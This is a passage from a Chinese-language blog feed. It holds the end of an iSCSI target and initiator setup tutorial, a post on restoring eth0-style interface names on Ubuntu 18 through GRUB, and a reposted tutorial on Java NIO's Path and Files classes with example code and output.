class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 删除默认0.0.0.0 3260端口 </span><br><span class="line">cd iscsi&#x2F;iqn.2020-03.com.ravenxrz:server&#x2F;tpg1&#x2F;portals&#x2F;</span><br><span class="line">delete 0.0.0.0 3260</span><br><span class="line"># 配置你想用于被访问的网卡的ip，可通过ip addr命令查看，如下图</span><br><span class="line">create 192.168.18.130 3260</span><br></pre></td></tr></table></figure><p><img data-src="https://pic.downk.cc/item/5e60ca5198271cb2b8a214fc.jpg"></p><p>最后，贴出<strong>完整配置</strong>：</p><p><img data-src="https://pic.downk.cc/item/5e60cf6298271cb2b8a5942d.png"></p><p>退出，重启服务，更新配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里应该回到了普通termial</span></span><br><span class="line">systemctl restart targetd</span><br></pre></td></tr></table></figure><p><strong>设置防火墙，放行3260端口</strong></p><p>如果是在个人的PC上的话，这一步应该没有。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent --add-port&#x3D;3260&#x2F;tcp</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><h2 id="2-Client端配置"><a href="#2-Client端配置" class="headerlink" title="2. Client端配置"></a>2. Client端配置</h2><p><strong>安装initiator工具包：</strong></p><ul><li>CenteOs：<code>yum install iscsi-initiator-utils</code></li><li>Ubuntu: <code>apt install open-iscsi</code></li></ul><p><strong>修改initiatorname</strong>，这一步很重要，就是把Server中配置的acl名字复制下来，然后修改这个文件：</p><p>vim /etc/iscsi/initiatorname.iscsi</p><p><img data-src="https://pic.downk.cc/item/5e60cc1d98271cb2b8a35c7b.jpg"></p><p>修改后重启iscsid服务:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart iscsid</span><br></pre></td></tr></table></figure><p><em>我这里是2020-02，上文中配的是2020-03，因为我之前已经配置过了，所以没有修改</em>，如果你一直按照之前的教程配置到这里的话，把2020-02替换为2020-03才行。</p><p><strong>查找iSCSItargets主机的targetname</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iscsiadm --mode discovery --type sendtargets --portal 192.168.18.130# 替换ip</span><br></pre></td></tr></table></figure><p><strong>登录iscsi</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iscsiadm --mode node --targetname iqn.2020-03.com.ravenxrz:server --portal 192.168.18.130:3260 --login</span><br></pre></td></tr></table></figure><p><em>如果是widnows端登录的话，将会非常简单，这里不作介绍，可参考这篇文章的末尾介绍。</em> <span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC82NDhiOGJlMTQ5OWY=" title="https://www.jianshu.com/p/648b8be1499f">https://www.jianshu.com/p/648b8be1499f<i class="fa fa-external-link"></i></span></p><h2 id="3-验证及使用"><a href="#3-验证及使用" class="headerlink" title="3. 验证及使用"></a>3. 验证及使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p><img data-src="https://pic.downk.cc/item/5e60cd2898271cb2b8a41232.jpg"></p><p>接下来可以分区，格式化，make文件系统，挂载等，就像和本地磁盘一样。</p><h2 id="4-退出及清除"><a href="#4-退出及清除" class="headerlink" title="4. 退出及清除"></a>4. 退出及清除</h2><p><strong>Client端退出</strong></p><p>取消挂在，然后退出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">umount xxx</span><br><span class="line">iscsiadm -m node -T iqn.2020-03.com.ravenxrz:server -u</span><br></pre></td></tr></table></figure><p><strong>Server清除所有配置</strong></p><p>清楚配置和配置过程就是一个逆过程，分别删除portals、acls、luns、iSCSI Targets和后端存储即可。</p><h2 id="5-参考"><a href="#5-参考" class="headerlink" title="5. 参考"></a>5. 参考</h2><ul><li><p><a href="https://www.cnblogs.com/iouwenbo/p/10229055.html"><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaW91d2VuYm8vcC8xMDIyOTA1NS5odG1s" title="https://www.cnblogs.com/iouwenbo/p/10229055.html">iSCSI配置与卸载<i class="fa fa-external-link"></i></span></a></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC82NDhiOGJlMTQ5OWY=" title="https://www.jianshu.com/p/648b8be1499f">使用 iSCSI 服务部署网络存储<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC83OGJlZGQ2OWJkOWQ=" title="https://www.jianshu.com/p/78bedd69bd9d">Linux就该这么学 | 第17章 部署 iSCSI 网络存储<i class="fa fa-external-link"></i></span></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iSCSI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu18修改网卡接口名</title>
      <link href="/archives/e7c30e88.html"/>
      <url>/archives/e7c30e88.html</url>
      
        <content type="html"><![CDATA[<p>ubuntu18上的默认网卡名为ens33，添加了网卡后的名字也“没什么规律”，所以这里说一下如何将ens33这类名字更改为原来的eth0,eth1的方法。</p><p>方法很简单：</p><ol><li><p>编辑/etc/default/grub</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# vi /etc/default/grub</span><br><span class="line"></span><br><span class="line">找到GRUB_CMDLINE_LINUX=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">改为GRUB_CMDLINE_LINUX=<span class="string">&quot;net.ifnames=0 biosdevname=0&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>重新生成GRUB的启动菜单配置文件(/boot/grub/grub.cfg)</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# update-grub</span><br></pre></td></tr></table></figure><ol start="3"><li>reboot即可</li></ol><p>接下来添加网卡的名字都会按照ethx的方式来添加。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网卡接口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Path和Files类使用介绍</title>
      <link href="/archives/c932cb39.html"/>
      <url>/archives/c932cb39.html</url>
      
        <content type="html"><![CDATA[<p>文本转载自: <span class="exturl" data-url="aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDAxNDkwMTAzOA==" title="https://segmentfault.com/a/1190000014901038">Java NIO之拥抱Path和Files<i class="fa fa-external-link"></i></span></p><p>加上整理了些 《Java核心技术卷2 – 高级特性》第2章.</p><p><a href="https://www.ravenxrz.ink/archives/a068fc76.html">JAVA IO流总结</a></p><a id="more"></a><h2 id="一-文件I-O基石：Path"><a href="#一-文件I-O基石：Path" class="headerlink" title="一 文件I/O基石：Path"></a>一 文件I/O基石：Path</h2><p>Java7中文件IO发生了很大的变化，专门引入了很多新的类来取代原来的基于java.io.File的文件IO操作方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.file.DirectoryStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystem;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.attribute.FileAttribute;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.attribute.PosixFilePermission;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.attribute.PosixFilePermissions;·</span><br><span class="line"></span><br><span class="line">......等等</span><br></pre></td></tr></table></figure><p>我们将从下面几个方面来学习Path类:</p><ul><li>创建一个Path</li><li>File和Path之间的转换，File和URI之间的转换</li><li>获取Path的相关信息</li><li>移除Path中的冗余项</li></ul><h3 id="1-创建一个Path"><a href="#1-创建一个Path" class="headerlink" title="1 创建一个Path"></a>1 创建一个Path</h3><p>创建Path实例可以通过 <strong>Paths工具类</strong> 的 <strong>get（）方法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用绝对路径</span></span><br><span class="line"> Path path= Paths.get(<span class="string">&quot;c:\\data\\myfile.txt&quot;</span>);</span><br><span class="line"><span class="comment">//使用相对路径</span></span><br><span class="line">Path path = Paths.get(<span class="string">&quot;/home/jakobjenkov/myfile.txt&quot;</span>);</span><br></pre></td></tr></table></figure><p>下面这种创建方式和上面等效：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Path path = FileSystems.getDefault().getPath(<span class="string">&quot;c:\\data\\myfile.txt&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="2-File和Path之间的转换，File和URI之间的转换"><a href="#2-File和Path之间的转换，File和URI之间的转换" class="headerlink" title="2 File和Path之间的转换，File和URI之间的转换"></a>2 File和Path之间的转换，File和URI之间的转换</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">File file = <span class="keyword">new</span> File(<span class="string">&quot;C:/my.ini&quot;</span>);</span><br><span class="line">Path p1 = file.toPath();</span><br><span class="line">p1.toFile();</span><br><span class="line">file.toURI();</span><br></pre></td></tr></table></figure><h3 id="3-获取Path的相关信息"><a href="#3-获取Path的相关信息" class="headerlink" title="3 获取Path的相关信息"></a>3 获取Path的相关信息</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用Paths工具类的get()方法创建</span></span><br><span class="line">Path path = Paths.get(<span class="string">&quot;D:\\XMind\\bcl-java.txt&quot;</span>);</span><br><span class="line"><span class="comment">//使用FileSystems工具类创建</span></span><br><span class="line"><span class="comment">//Path path2 = FileSystems.getDefault().getPath(&quot;c:\\data\\myfile.txt&quot;);</span></span><br><span class="line">System.out.println(<span class="string">&quot;文件名：&quot;</span> + path.getFileName());</span><br><span class="line">System.out.println(<span class="string">&quot;名称元素的数量：&quot;</span> + path.getNameCount());</span><br><span class="line">System.out.println(<span class="string">&quot;父路径：&quot;</span> + path.getParent());</span><br><span class="line">System.out.println(<span class="string">&quot;根路径：&quot;</span> + path.getRoot());</span><br><span class="line">System.out.println(<span class="string">&quot;是否是绝对路径：&quot;</span> + path.isAbsolute());</span><br><span class="line"><span class="comment">//startsWith()方法的参数既可以是字符串也可以是Path对象</span></span><br><span class="line">System.out.println(<span class="string">&quot;是否是以为给定的路径D:开始：&quot;</span> + path.startsWith(<span class="string">&quot;D:\\&quot;</span>) );</span><br><span class="line">System.out.println(<span class="string">&quot;该路径的字符串形式：&quot;</span> + path.toString());</span><br></pre></td></tr></table></figure><p><strong>结果：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">文件名：bcl-java.txt</span><br><span class="line">名称元素的数量：<span class="number">2</span></span><br><span class="line">父路径：D:\XMind</span><br><span class="line">根路径：D:\</span><br><span class="line">是否是绝对路径：<span class="keyword">true</span></span><br><span class="line">是否是以为给定的路径D:开始：<span class="keyword">true</span></span><br><span class="line">该路径的字符串形式：D:\XMind\bcl-java.txt</span><br></pre></td></tr></table></figure><h3 id="4-移除冗余项"><a href="#4-移除冗余项" class="headerlink" title="4 移除冗余项"></a>4 移除冗余项</h3><p>某些时候在我们需要处理的Path路径中可能会有一个或两个点</p><ul><li>.表示的是当前目录</li><li>..表示父目录或者说是上一级目录：</li></ul><p>下面通过实例来演示一下使用Path类的normalize()和toRealPath()方法把.和..去除。</p><ul><li><strong>normalize()</strong> : 返回一个路径，该路径是冗余名称元素的消除。</li><li><strong>toRealPath()</strong> : 融合了toAbsolutePath()方法和normalize()方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//.表示的是当前目录</span></span><br><span class="line">Path currentDir = Paths.get(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">System.out.println(currentDir.toAbsolutePath());<span class="comment">//输出C:\Users\Administrator\NIODemo\.</span></span><br><span class="line">Path currentDir2 = Paths.get(<span class="string">&quot;.\\NIODemo.iml&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;原始路径格式：&quot;</span>+currentDir2.toAbsolutePath());</span><br><span class="line">System.out.println(<span class="string">&quot;执行normalize（）方法之后：&quot;</span>+currentDir2.toAbsolutePath().normalize());</span><br><span class="line">System.out.println(<span class="string">&quot;执行toRealPath()方法之后：&quot;</span>+currentDir2.toRealPath());</span><br><span class="line"></span><br><span class="line"><span class="comment">//..表示父目录或者说是上一级目录：</span></span><br><span class="line">Path currentDir3 = Paths.get(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;原始路径格式：&quot;</span>+currentDir3.toAbsolutePath());</span><br><span class="line">System.out.println(<span class="string">&quot;执行normalize（）方法之后：&quot;</span>+currentDir3.toAbsolutePath().normalize());</span><br><span class="line">System.out.println(<span class="string">&quot;执行toRealPath()方法之后：&quot;</span>+currentDir3.toRealPath());</span><br></pre></td></tr></table></figure><p><strong>结果：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\NIODemo\.</span><br><span class="line">原始路径格式：C:\Users\Administrator\NIODemo\.\NIODemo.iml</span><br><span class="line">执行normalize（）方法之后：C:\Users\Administrator\NIODemo\NIODemo.iml</span><br><span class="line">执行toRealPath()方法之后：C:\Users\Administrator\NIODemo\NIODemo.iml</span><br><span class="line">原始路径格式：C:\Users\Administrator\NIODemo\..</span><br><span class="line">执行normalize（）方法之后：C:\Users\Administrator</span><br><span class="line">执行toRealPath()方法之后：C:\Users\Administrator</span><br></pre></td></tr></table></figure><h2 id="二-拥抱Files类"><a href="#二-拥抱Files类" class="headerlink" title="二 拥抱Files类"></a>二 拥抱Files类</h2><p>Java NIO中的Files类（java.nio.file.Files）提供了多种操作文件系统中文件的方法。本节教程将覆盖大部分方法。Files类包含了很多方法，所以如果本文没有提到的你也可以直接查询JavaDoc文档。</p><p>java.nio.file.Files类是和java.nio.file.Path相结合使用的</p><h3 id="1-检查给定的Path在文件系统中是否存在"><a href="#1-检查给定的Path在文件系统中是否存在" class="headerlink" title="1 检查给定的Path在文件系统中是否存在"></a>1 检查给定的Path在文件系统中是否存在</h3><p>通过 <strong>Files.exists()</strong> 检测文件路径是否存在：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Path path = Paths.get(<span class="string">&quot;D:\\XMind\\bcl-java.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">boolean</span> pathExists =</span><br><span class="line">         Files.exists(path,</span><br><span class="line">                 <span class="keyword">new</span> LinkOption[]&#123;LinkOption.NOFOLLOW_LINKS&#125;);</span><br><span class="line"> System.out.println(pathExists);<span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>注意Files.exists()的的第二个参数。它是一个数组，这个参数直接影响到Files.exists()如何确定一个路径是否存在。在本例中，这个数组内包含了LinkOptions.NOFOLLOW_LINKS，表示检测时不包含符号链接文件。</p><h3 id="2-创建文件-文件夹"><a href="#2-创建文件-文件夹" class="headerlink" title="2 创建文件/文件夹"></a>2 创建文件/文件夹</h3><ul><li><strong>创建文件：</strong></li></ul><p>通过 <strong>Files.createFile()</strong> 创建文件,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Path target2 = Paths.get(<span class="string">&quot;C:\\mystuff.txt&quot;</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!Files.exists(target2))</span><br><span class="line">        Files.createFile(target2);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>创建文件夹：</strong><ul><li>通过 <strong>Files.createDirectory()</strong> 创建文件夹</li><li>通过 <strong>Files.createDirectories()</strong> 创建文件夹</li></ul></li></ul><p>Files.createDirectories()会首先创建所有不存在的父目录来创建目录，而Files.createDirectory()方法只是创建目录，如果它的上级目录不存在就会报错。比如下面的程序使用<strong>Files.createDirectory()</strong> 方法创建就会报错，这是因为我的D盘下没有data文件夹，加入存在data文件夹的话则没问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Path path = Paths.get(<span class="string">&quot;D://data//test&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Path newDir = Files.createDirectories(path);</span><br><span class="line">&#125; <span class="keyword">catch</span>(FileAlreadyExistsException e)&#123;</span><br><span class="line">    <span class="comment">// the directory already exists.</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    <span class="comment">//something else went wrong</span></span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-删除文件或目录"><a href="#3-删除文件或目录" class="headerlink" title="3 删除文件或目录"></a>3 删除文件或目录</h3><p>通过 <strong>Files.delete()方法</strong> 可以删除一个文件或目录：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Path path = Paths.get(<span class="string">&quot;data/subdir/logging-moved.properties&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Files.delete(path);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    <span class="comment">//deleting file failed</span></span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-把一个文件从一个地址复制到另一个位置"><a href="#4-把一个文件从一个地址复制到另一个位置" class="headerlink" title="4 把一个文件从一个地址复制到另一个位置"></a>4 把一个文件从一个地址复制到另一个位置</h3><p>通过Files.copy()方法可以吧一个文件从一个地址复制到另一个位置,这个方法适合中小型文件，大型文件推荐使用Java的IO流，如BufferWriter等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Path sourcePath      &#x3D; Paths.get(&quot;data&#x2F;logging.properties&quot;);</span><br><span class="line">Path destinationPath &#x3D; Paths.get(&quot;data&#x2F;logging-copy.properties&quot;);</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line">    Files.copy(sourcePath, destinationPath);</span><br><span class="line">&#125; catch(FileAlreadyExistsException e) &#123;</span><br><span class="line">    &#x2F;&#x2F;destination file already exists</span><br><span class="line">&#125; catch (IOException e) &#123;</span><br><span class="line">    &#x2F;&#x2F;something else went wrong</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>copy操作还可可以强制覆盖已经存在的目标文件，只需要将上面的copy()方法改为如下格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Files.copy(sourcePath, destinationPath,</span><br><span class="line">        StandardCopyOption.REPLACE_EXISTING);</span><br></pre></td></tr></table></figure><h3 id="5-获取文件属性"><a href="#5-获取文件属性" class="headerlink" title="5 获取文件属性"></a>5 获取文件属性</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Path path = Paths.get(<span class="string">&quot;D:\\XMind\\bcl-java.txt&quot;</span>);</span><br><span class="line">System.out.println(Files.getLastModifiedTime(path));</span><br><span class="line">System.out.println(Files.size(path));</span><br><span class="line">System.out.println(Files.isSymbolicLink(path));</span><br><span class="line">System.out.println(Files.isDirectory(path));</span><br><span class="line">System.out.println(Files.readAttributes(path, <span class="string">&quot;*&quot;</span>));</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2016-05-18T08:01:44Z</span><br><span class="line">18934</span><br><span class="line">false</span><br><span class="line">false</span><br><span class="line">&#123;lastAccessTime&#x3D;2017-04-12T01:42:21.149351Z, lastModifiedTime&#x3D;2016-05-18T08:01:44Z, size&#x3D;18934, creationTime&#x3D;2017-04-12T01:42:21.149351Z, isSymbolicLink&#x3D;false, isRegularFile&#x3D;true, fil</span><br></pre></td></tr></table></figure><p>除了上述方式，Java库中还提供了BasicFileAttributes类和PosixFileAttributes类进行访问文件属性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BasicFileAttributes fileAttr =Files.readAttributes(currentDir,BasicFileAttributes.class);</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">PosixFileAttributes fileAttr =Files.readAttributes(currentDir,PosixFileAttributes.class);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="6-遍历一个文件夹"><a href="#6-遍历一个文件夹" class="headerlink" title="6 遍历一个文件夹"></a>6 遍历一个文件夹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Path dir &#x3D; Paths.get(&quot;D:\\Java&quot;);</span><br><span class="line">&#x2F;&#x2F; Files.newDirectoryStream(dir,&#x2F;* 第二参数可传入Glob匹配模式，用于匹配文件类型非常有用 *&#x2F; )</span><br><span class="line">try(DirectoryStream&lt;Path&gt; stream &#x3D; Files.newDirectoryStream(dir))&#123;</span><br><span class="line">for(Path e : stream)&#123;</span><br><span class="line">System.out.println(e.getFileName());</span><br><span class="line">&#125;</span><br><span class="line">&#125;catch(IOException e)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">apache-maven-3.5.0</span><br><span class="line">Eclipse</span><br><span class="line">intellij idea</span><br><span class="line">Jar</span><br><span class="line">JDK</span><br><span class="line">MarvenRespository</span><br><span class="line">MyEclipse 2017 CI</span><br><span class="line">Nodejs</span><br><span class="line">RedisDesktopManager</span><br><span class="line">solr-7.2.1</span><br></pre></td></tr></table></figure><p>上面是遍历单个目录，它不会遍历整个目录。遍历整个目录需要使用：Files.walkFileTree().Files.walkFileTree()方法具有递归遍历目录的功能。</p><h3 id="7-遍历整个文件目录："><a href="#7-遍历整个文件目录：" class="headerlink" title="7 遍历整个文件目录："></a>7 遍历整个文件目录：</h3><p>walkFileTree接受一个Path和FileVisitor作为参数。Path对象是需要遍历的目录，FileVistor则会在每次遍历中被调用。</p><p>FileVisitor需要调用方自行实现，然后作为参数传入walkFileTree().FileVisitor的每个方法会在遍历过程中被调用多次。如果不需要处理每个方法，那么可以继承它的默认实现类SimpleFileVisitor，它将所有的接口做了空实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WorkFileTree</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        Path startingDir = Paths.get(<span class="string">&quot;D:\\apache-tomcat-9.0.0.M17&quot;</span>);</span><br><span class="line">        List&lt;Path&gt; result = <span class="keyword">new</span> LinkedList&lt;Path&gt;();</span><br><span class="line">        Files.walkFileTree(startingDir, <span class="keyword">new</span> FindJavaVisitor(result));</span><br><span class="line">        System.out.println(<span class="string">&quot;result.size()=&quot;</span> + result.size());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">FindJavaVisitor</span> <span class="keyword">extends</span> <span class="title">SimpleFileVisitor</span>&lt;<span class="title">Path</span>&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> List&lt;Path&gt; result;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">FindJavaVisitor</span><span class="params">(List&lt;Path&gt; result)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.result = result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> FileVisitResult <span class="title">visitFile</span><span class="params">(Path file, BasicFileAttributes attrs)</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(file.toString().endsWith(<span class="string">&quot;.java&quot;</span>))&#123;</span><br><span class="line">                result.add(file.getFileName());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> FileVisitResult.CONTINUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这个例子输出了我的D:\apache-tomcat-9.0.0.M17也就是我的Tomcat安装目录下以.java结尾文件的数量。</p><p><strong>结果：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result.size()=<span class="number">4</span></span><br></pre></td></tr></table></figure><p>Files类真的很强大，除了我讲的这些操作之外还有其他很多操作比如：读取和设置文件权限、更新文件所有者等等操作。</p><p>我这里就介绍这么多了，如果想要详细了解的可以自行查阅官方文档或者相关书籍。</p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
